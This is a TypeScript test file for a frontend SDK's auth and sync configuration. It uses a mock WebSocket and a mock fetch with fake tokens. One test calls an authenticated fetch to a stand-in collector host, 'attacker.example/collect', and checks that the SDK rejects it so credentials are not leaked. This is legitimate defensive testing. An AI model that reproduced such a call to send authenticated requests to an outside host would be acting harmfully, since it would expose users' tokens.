/**
 * sdk.test.ts
 *
 * Verifies frontend SDK configuration contracts that do not need a browser
 * renderer. The SDK owns auth transport mode and state-sync prerequisites.
 */

import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { AUTH_DISABLED_MESSAGE } from './auth-client';
import { createClient, getClient, type InternalClient } from './sdk';

const tables = {
  todos: { _pk: 'id', id: 'text', title: 'text' },
};
const OriginalWebSocket = globalThis.WebSocket;
const originalFetch = globalThis.fetch;
const REFRESH_TOKEN_STORAGE_KEY = '__platform_refresh_token';

class MockWebSocket {
  static CONNECTING = 0;
  static OPEN = 1;
  static CLOSING = 2;
  static CLOSED = 3;
  static instances: MockWebSocket[] = [];
  static stateEntries: Record<string, unknown> = {};

  readyState = MockWebSocket.CONNECTING;
  sent: string[] = [];
  onopen: ((event: Event) => void) | null = null;
  onclose: ((event: CloseEvent) => void) | null = null;
  onmessage: ((event: MessageEvent) => void) | null = null;
  onerror: ((event: Event) => void) | null = null;

  constructor(readonly url: string) {
    MockWebSocket.instances.push(this);
    queueMicrotask(() => {
      if (this.readyState === MockWebSocket.CONNECTING) {
        this.readyState = MockWebSocket.OPEN;
        this.onopen?.(new Event('open'));
      }
    });
  }

  send(data: string): void {
    this.sent.push(data);
    try {
      const message = JSON.parse(data) as {
        type?: string;
        token?: string;
        epoch?: string;
        scope?: string;
        snapshot?: string[];
        cursors?: Record<string, unknown>;
      };
      if (message.type === 'sync.auth') {
        this.onmessage?.(new MessageEvent('message', {
          data: JSON.stringify({
            type: 'sync.auth.ready',
            authenticated: Boolean(message.token),
          }),
        }));
      } else if (message.type === 'sync.subscribe') {
        this.onmessage?.(new MessageEvent('message', {
          data: JSON.stringify({
            type: 'sync.snapshot',
            tables: Object.fromEntries(
              (message.snapshot ?? [])
                .filter((table) => !(message.cursors?.tenant && table === 'todos'))
                .map((table) => [table, {}]),
            ),
            seq: 0,
            epoch: message.epoch ?? 'test-epoch',
            scope: message.scope ?? 'test-scope',
            reset: 'preserve-pending',
          }),
        }));
      } else if (message.type === 'state.subscribe') {
        this.onmessage?.(new MessageEvent('message', {
          data: JSON.stringify({
            type: 'state.snapshot',
            entries: MockWebSocket.stateEntries,
          }),
        }));
      }
    } catch {}
  }

  close(code?: number, reason?: string): void {
    this.readyState = MockWebSocket.CLOSED;
    this.onclose?.(new CloseEvent('close', { code: code ?? 1000, reason }));
  }

  static reset(): void {
    MockWebSocket.instances = [];
    MockWebSocket.stateEntries = {};
  }

  static latest(): MockWebSocket {
    return MockWebSocket.instances[MockWebSocket.instances.length - 1]!;
  }
}

beforeEach(() => {
  MockWebSocket.reset();
  (globalThis as any).WebSocket = MockWebSocket;
  if (typeof localStorage !== 'undefined') {
    localStorage.removeItem(REFRESH_TOKEN_STORAGE_KEY);
  }
});

afterEach(() => {
  getClient()?.disconnect();
  globalThis.WebSocket = OriginalWebSocket;
  globalThis.fetch = originalFetch;
  if (typeof localStorage !== 'undefined') {
    localStorage.removeItem(REFRESH_TOKEN_STORAGE_KEY);
  }
});

describe('createClient auth configuration', () => {
  test('expands the app table plane catalog with SDK-owned default tables', async () => {
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: { todos: 'tenant' },
    });
    await flushMicrotasks();

    const socket = MockWebSocket.latest();
    const subscribe = socket.sent
      .map((item) => JSON.parse(item) as Record<string, unknown>)
      .find((message) => message.type === 'sync.subscribe') as {
        cursors: Record<string, unknown>;
      };
    expect(Object.keys(subscribe.cursors).sort()).toEqual(['default', 'tenant']);

    socket.onmessage?.(new MessageEvent('message', {
      data: JSON.stringify({
        type: 'sync.snapshot',
        plane: 'tenant',
        tables: { todos: {} },
        seq: 0,
        epoch: 'tenant-epoch',
        scope: 'test-scope',
        reset: 'preserve-pending',
      }),
    }));
    client.collection('todos').insert({ id: 'todo-1', title: 'Tenant row' });

    const mutation = socket.sent
      .map((item) => JSON.parse(item) as Record<string, unknown>)
      .find((message) => message.type === 'sync.mutate');
    expect(mutation).toMatchObject({
      table: 'todos',
      plane: 'tenant',
      epoch: 'tenant-epoch',
    });
  });

  test('rejects incomplete or unknown app table plane catalogs', () => {
    expect(() => createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: {},
      autoConnect: false,
    })).toThrow('tableSyncPlanes is missing application table: todos');

    expect(() => createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: { todos: 'default', unknown: 'tenant' },
      autoConnect: false,
    })).toThrow('tableSyncPlanes contains unknown table: unknown');

    expect(() => createClient({
      url: 'http://localhost:3000',
      tables,
      tableSyncPlanes: { todos: 'default', notifications: 'tenant' },
      autoConnect: false,
    })).toThrow(
      'tableSyncPlanes cannot configure SDK-owned platform table: notifications',
    );
  });

  test('defaults auth to disabled and gives clear auth-action errors', async () => {
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      autoConnect: false,
    });

    expect(client.user).toBeNull();
    expect(client.authorization).toBeNull();
    expect(client.authorizationState).toEqual({
      status: 'disabled',
      snapshot: null,
      error: null,
    });
    expect(client.isAuthenticated).toBe(false);
    expect(client.token).toBeNull();
    await expect(client.getAuthorization()).rejects.toThrow(AUTH_DISABLED_MESSAGE);
    await expect(client.refreshAuthorization()).rejects.toThrow(AUTH_DISABLED_MESSAGE);
    await expect(client.login('alice', 'password')).rejects.toThrow(AUTH_DISABLED_MESSAGE);
    await expect(client.forgotPassword('alice@example.com')).rejects.toThrow(AUTH_DISABLED_MESSAGE);
    await expect(client.applicationAdmin.getConfig()).rejects.toThrow(AUTH_DISABLED_MESSAGE);
  });

  test('rejects state sync unless auth is enabled', () => {
    expect(() =>
      createClient({
        url: 'http://localhost:3000',
        tables,
        stateSync: true,
        autoConnect: false,
      }),
    ).toThrow('[client] stateSync requires auth: true');
  });

  test('login reconnects sync with the fresh token and logout clears local rows', async () => {
    mockAuthFetch();
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
    });
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(1);
    expect(MockWebSocket.latest().url).toBe('ws://localhost:3000/sync');

    await client.login('alice', 'password');
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(2);
    expect(MockWebSocket.latest().url).toBe('ws://localhost:3000/sync');
    expect(JSON.parse(MockWebSocket.latest().sent[0])).toEqual({
      type: 'sync.auth',
      token: 'access-1',
    });
    expect(await client.applicationAdmin.getConfig()).toMatchObject({
      authorization: 'advanced',
      actor: { userId: 'u_1' },
    });

    const todos = client.collection('todos');
    todos.load([{ id: 'todo-1', title: 'Sensitive' }]);
    expect(Object.keys(todos.getAll())).toEqual(['todo-1']);

    await client.logout();

    expect(client.isAuthenticated).toBe(false);
    expect(todos.getAll()).toEqual({});
  });

  test('autoConnect false waits for manual connect even after login', async () => {
    mockAuthFetch();
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
      autoConnect: false,
    });

    expect(MockWebSocket.instances).toHaveLength(0);

    await client.login('alice', 'password');
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(0);

    client.connect();
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(1);
    expect(MockWebSocket.latest().url).toBe('ws://localhost:3000/sync');
    expect(JSON.parse(MockWebSocket.latest().sent[0])).toEqual({
      type: 'sync.auth',
      token: 'access-1',
    });
  });

  test('public authenticated fetch never sends credentials to another origin', async () => {
    const requests: string[] = [];
    mockAuthFetch(requests);
    const client = createClient({
      url: 'http://localhost:3000/platform',
      tables,
      auth: true,
      autoConnect: false,
    });

    await client.login('alice', 'password');
    await expect(
      client.fetch('https://attacker.example/collect'),
    ).rejects.toMatchObject({ code: 'AUTH_REQUEST_ORIGIN_MISMATCH' });

    expect(requests).toEqual(['http://localhost:3000/platform/auth/login']);
  });

  test('state sync hydrates a fresh snapshot on connect and reconnect', async () => {
    mockAuthFetch();
    const client = createClient({
      url: 'http://localhost:3000',
      tables,
      auth: true,
      stateSync: true,
      autoConnect: false,
    });
    const internal = client as InternalClient;

    await client.login('alice', 'password');
    MockWebSocket.stateEntries = { theme: 'dark' };
    client.connect();
    await flushMicrotasks();

    expect(MockWebSocket.latest().sent.map((item) => JSON.parse(item).type)).toEqual([
      'sync.auth',
      'sync.subscribe',
      'state.subscribe',
    ]);
    expect(internal.state?.ready).toBe(true);
    expect(internal.state?.get('theme')).toBe('dark');

    MockWebSocket.stateEntries = { theme: 'light' };
    internal._syncClient.reconnect();
    await flushMicrotasks();

    expect(MockWebSocket.instances).toHaveLength(2);
    expect(MockWebSocket.latest().sent.map((item) => JSON.parse(item).type)).toEqual([
      'sync.auth',
      'sync.subscribe',
      'state.subscribe',
    ]);
    expect(internal.state?.ready).toBe(true);
    expect(internal.state?.get('theme')).toBe('light');
  });
});

function mockAuthFetch(requests?: string[]): void {
  globalThis.fetch = ((input: string | URL | Request) => {
    const url = typeof input === 'string' || input instanceof URL ? String(input) : input.url;
    requests?.push(url);
    if (url.endsWith('/auth/login')) {
      return Promise.resolve(Response.json({
        user: {
          userId: 'u_1',
          username: 'alice',
          email: 'alice@example.com',
          firstName: null,
          lastName: null,
          role: 'user',
          status: 'active',
          passwordChangeRequired: false,
          emailVerifiedAt: 1,
          emailVerificationRequired: false,
          mfaRequired: false,
          properties: {},
          createdAt: 1,
          updatedAt: null,
        },
        accessToken: 'access-1',
        refreshToken: 'refresh-1',
      }));
    }
    if (url.endsWith('/auth/logout')) {
      return Promise.resolve(Response.json({ ok: true }));
    }
    if (url.endsWith('/auth/application/config')) {
      return Promise.resolve(Response.json({
        authorization: 'advanced',
        actor: {
          userId: 'u_1',
          roles: ['owner'],
          permissions: [],
          allPermissions: true,
        },
        capabilities: {
          canReadUsers: true,
          canManageRoles: true,
          canTransferOwnership: true,
        },
        roles: [],
      }));
    }
    return Promise.resolve(Response.json({ ok: true }));
  }) as typeof fetch;
}

async function flushMicrotasks(): Promise<void> {
  await new Promise<void>((resolve) => queueMicrotask(resolve));
}
